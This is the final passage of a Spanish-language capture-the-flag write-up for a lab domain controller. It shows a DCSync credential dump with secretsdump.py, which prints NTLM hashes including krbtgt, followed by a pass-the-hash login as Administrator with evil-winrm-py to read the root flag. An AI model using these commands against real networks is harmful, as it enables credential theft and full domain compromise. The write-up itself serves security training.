> Te recomiendo repetir los pasos para generar el TGS para la `dMSA`, ya que la expiración de tickets es de un período de unos `15` minutos, de lo contrario verás el error `KRB_AP_ERR_TKT_EXPIRED`.
{: .notice--warning}

``` bash
proxychains -q secretsdump.py DC01.eighteen.htb -k -no-pass -just-dc
     
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b1...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a7c7a912503b16d8402008c1aebdb649:::
mssqlsvc:1601:aad3b435b51404eeaad3b435b51404ee:c44d16951b0810e8f3bbade300966ec4:::
eighteen.htb\jamie.dunn:1606:aad3b435b51404eeaad3b435b51404ee:9fbaaf9e93e576187bb840e93971792a:::
eighteen.htb\jane.smith:1607:aad3b435b51404eeaad3b435b51404ee:42554e3213381f9d1787d2dbe6850d21:::
```


## Root Time

Ya con el hash NTLM del usuario `Administrator`, nos podremos conectar sin necesidad de usar un proxy con la herramienta `evil-winrm-py`

``` bash
evil-winrm-py -i DC01.eighteen.htb -u Administrator -H '0b1...'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC01.eighteen.htb:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
eighteen\administrator
```

Ya podremos ver la flag ubicada en el escritorio del usuario `Administrator`

``` powershell
evil-winrm-py PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
4bf...
```

Gracias por leer, a continuación te dejo la cita del día.

> Consider that not only do negative thoughts and emotions destroy our experience of peace, they also undermine our health.
> — Dalai Lama
{: .notice--info}
